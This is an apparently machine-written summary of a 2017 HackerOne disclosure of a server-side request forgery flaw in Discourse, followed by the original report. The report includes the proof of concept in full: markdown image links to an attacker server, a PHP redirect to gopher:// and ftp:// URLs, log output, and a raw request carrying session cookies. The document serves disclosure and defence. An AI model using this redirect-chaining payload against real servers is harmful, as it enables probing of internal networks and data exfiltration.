# Server-Side Request Forgery (SSRF) in Image URL Upload via Markdown

## Metadata
- **Source:** HackerOne
- **Report:** 228377 | https://hackerone.com/reports/228377
- **Submitted:** 2017-05-14
- **Reporter:** mariuszdeepsec
- **Program:** Discourse
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Server-Side Request Forgery (SSRF), Improper Input Validation, Unsafe URL Scheme Handling
- **CVEs:** None
- **Category:** web-api

## Summary
Discourse's image upload functionality through markdown links fails to properly validate and restrict URL schemes, allowing attackers to craft server-side requests to arbitrary protocols (ftp, gopher, etc.) and internal networks. An attacker can embed malicious image URLs in private messages that trigger the server to make outbound connections to attacker-controlled or internal resources, enabling network reconnaissance and potential data exfiltration.

## Attack scenario
1. Attacker identifies that Discourse processes image URLs embedded in markdown markdown syntax during message composition
2. Attacker creates a malicious PHP redirect script on external server that responds with Location header pointing to restricted protocol (ftp://, gopher://, etc.)
3. Attacker embeds image markdown link pointing to malicious PHP in private message: [![](http://attacker.com/malicious.php)](http://attacker.com/malicious.php)
4. When victim sends message or server processes it, Discourse's Ruby HTTP client fetches the image URL without scheme validation
5. Server follows the redirect to restricted protocol, establishing connection to internal network or attacker infrastructure
6. Attacker monitors logs to confirm SSRF execution and gains ability to probe internal services or exfiltrate data through various protocols

## Root cause
Discourse fails to implement URL scheme whitelist validation before passing URLs to the Ruby HTTP client. The application processes user-supplied URLs without restricting them to safe schemes (http/https), allowing the underlying HTTP client library to interpret and follow dangerous protocol handlers like ftp://, gopher://, and file://. Additionally, HTTP redirect responses are followed without scheme validation.

## Attacker mindset
An attacker would recognize that image processing pipelines commonly fetch remote URLs and exploit this as an SSRF vector. By chaining HTTP redirects with protocol handlers, they bypass naive http-only checks. The attacker aims to probe internal network topology, access internal services (FTP servers, gopher services), or establish reverse connections from the target server to attacker infrastructure for command execution.

## Defensive takeaways
- Implement strict URL scheme whitelist: only allow http and https schemes, reject all others including ftp, gopher, file, data, jar, etc.
- Disable HTTP client automatic redirect following or validate target URL scheme after each redirect before proceeding
- Implement URL parsing validation at multiple layers: sanitize user input, validate after parsing, and validate before making requests
- Configure HTTP client library with explicit scheme allowlisting and disable protocol handlers for dangerous schemes
- Implement network-level controls: prevent outbound connections to private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, localhost)
- Add request timeout limits and rate limiting for image fetch operations to mitigate DoS and resource exhaustion
- Log and monitor all outbound connections from image processing pipeline for anomaly detection
- Use allowlists for permitted image domains rather than blacklist approaches

## Variant hunting
Hunt for similar issues in: (1) other media upload endpoints (video thumbnails, document preview generation), (2) URL preview/unfurl features in chat or timeline systems, (3) webhook/callback URL validation, (4) RSS feed readers and link aggregators, (5) any feature that fetches remote content based on user input, (6) PDF/document processing that loads external resources, (7) email clients that auto-load images from URLs, (8) analytics pixel tracking implementations

## MITRE ATT&CK
- T1190
- T1021
- T1570
- T1041

## Notes
Report from May 2017 targeting try.discourse.org. Demonstrates practical exploitation using gopher:// and ftp:// protocols via HTTP redirect chaining. The vulnerability is fundamental to image URL processing without input validation. Similar SSRF vulnerabilities have been common in web applications that process user-supplied URLs. The researcher effectively demonstrates protocol confusion attacks and network reconnaissance from SSRF. Ruby's Net::HTTP library follows redirects by default and respects various protocol handlers unless explicitly restricted.

## Full report
<details><summary>Expand</summary>

-Short description

Private message function is vulnerable is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from  servers to any destination on the internet and discourse internal network and craft outgoing UDP-packet (for example, to connect to  FTP  servers from discourse).
read more at:
https://cwe.mitre.org/data/definitions/918.html

1. Load http://try.discourse.org
2. Go to new message composer
3. Set the receiver, topic 
4 set the message content
TEST  [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)

5. Set the malicious3.php file on your remote server to:

<?php
        header('Location: gopher://192.166.218.53:80/test123');
?>

6. Send the private message.

7. Check your remote server, in my case "192.166.218.53" web logs file (access.log)
OUTPUT :

64.71.168.198 - - [14/May/2017:16:38:04 -0400] "HEAD /malicious3.php HTTP/1.1" 302 187 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36"
64.71.168.198 - - [14/May/2017:16:38:04 -0400] "GET /malicious3.php HTTP/1.1" 302 225 "-" "Ruby"
64.71.168.198 - - [14/May/2017:16:38:04 -0400] "HEAD /test123 HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36"

-------------------------------------------------------------------------------------

-  Request for FTP connection
1. Load http://try.discourse.org
2. Go to new message composer
3. Set the receiver, topic
4. set the message content
TESTs  [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)

5. Set the malicious3.php file on your remote server to:

<?php
        header('Location: ftp://192.166.218.53/');
?>

6. Send the private message.

7. Check your remote server, in my case "192.166.218.53" ftp  logs file. (vsftp.log).
OUTPUT :
Sun May 14 15:29:40 2017 [pid 18354] CONNECT: Client "::ffff:64.71.168.198"

-------------------------------------------------------------------------------------
- Here is the burp suite request:

POST /posts HTTP/1.1
Host: try.discourse.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-CSRF-Token: 1QJrm4k6xUHhUyhoEJUElbbSVsufYPnbQd8N+Jti7/TtHEJxOpfDairKu0ufS/ovBIWt/mtdISC36Tx8OMdD/w==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Discourse-Visible: true
X-Requested-With: XMLHttpRequest
Referer: https://try.discourse.org/t/adsadas/835/7
Content-Length: 437
Cookie: __utma=228756441.806995719.1494765035.1494768541.1494792827.3; __utmc=228756441; __utmz=228756441.1494765035.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _forum_session=V29LcnpQVXRTdWJ5dUdkWXQxOEhRRXFHRk5vbmtMS2lhRHdqVXdsYjRpUzhpQ2I1OHBLZVFZVFJqUXFtTUZXM0p0MTJwNWh0M3k3Y0R0NDl0VFBjR3hBQkZZMUlMbno5eTQvOEZtZkdjTFNzTVBNL1R1SDRua1BVMWtpTURyWXR3bnNGeWFPb1pBQnFpQW1ORFllNG04bWthUkFVZ01YTm9PWVB2dS96bmUybXkxU1ZaS2c1WkVlbExwK0pRMjlvaGF6WWY5bi9WeGlrd2xFNmtUYWhUaE01OHVRT05acFJWV3AyQXhUQ1U4YVpVZDV6UVFjSDBtc2NJa3R6dE1aeDVnaE9BblBKK0J4QVlKdGMxQmtYSTNZaGlJL1NFL3lma2pRVktIZWROazZnMTlmbXpSRDFTeVRWeHMveS9HckYxQXdjZ2dZQjdIVmV3aW4reUgzYjNwUWJ2YXVYY0Z4cWlrL2dzeXBmUGoxZVdhQ0JBTTFKZlB3SWhiZ24yZHZkVGYzYVJFb3lJZEhVTENxbHc1WWN1eDdrVGlVTHNLMTZEMG12WTJnVVNQRVhkWEhoTU1EUDNyQVZUdklkdmQwSlNhSlZVcXhQL3FFSzRqWmRyeFozV3BxRWtrK3FuZzBsWnlXVmVJeFVxNTBOMk5YVnR4d21kTXlIaEtlakp3aEJPZURoNm11Uy83d3l6U09kZnNrNnNiUEJBSjRQT0xXdWtqdlUxak5LK2MyaW1kbUlSRGtjWWo5eWJZT21OMk9ScmNFd1o2OG4xUTNIV0ZoVHJlVTFFSUlxKy9RbmZERDRtQ1dKaDVtSFBEeFZXMTNsOEcrMG13Vzc3c1R3R2hJMUdNOHJHT0lHRU93U20waG5pajhRQTZVNmhGT0tVTmNZa1d6TW5HSVg3c2pvTUkrNjhNZFpwRHVyalFVSWVWa0ktLTdpcUxTWCs5dEhsVHRFekRDQ3FLUHc9PQ%3D%3D--3bf9351bc59d99d10f831dcc1e647054ddef3c41; __utmb=228756441.9.10.1494792827; _t=aebe2511952a805cec46af434b6617d5
Connection: close

raw=TESTa+%5B!%5B%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)&unlist_topic=false&category=&topic_id=835&is_warning=false&archetype=regular&typing_duration_msecs=100&composer_open_duration_msecs=9183&featured_link=&image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bwidth%5D=24&image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bheight%5D=24&nested_post=true

-------------------------------------------------------------------------------------

The attacker is able to send internal server side requests using Ruby client.
Check the attached screens for prove.

Why does the vulnerability exist?

discourse.org does not properly validate user input and does not configure ruby client properly which allows an attacker to use various  protocol wrappers other than http(s). For example, an attacker can supply ftp://test.com/file as an URL and discourse will make such a FTP request.

If the description is not clear please feel free to ask us for more detailed report.

regards www.afine.pl



</details>

---
*Analysed by Claude on 2026-05-24*
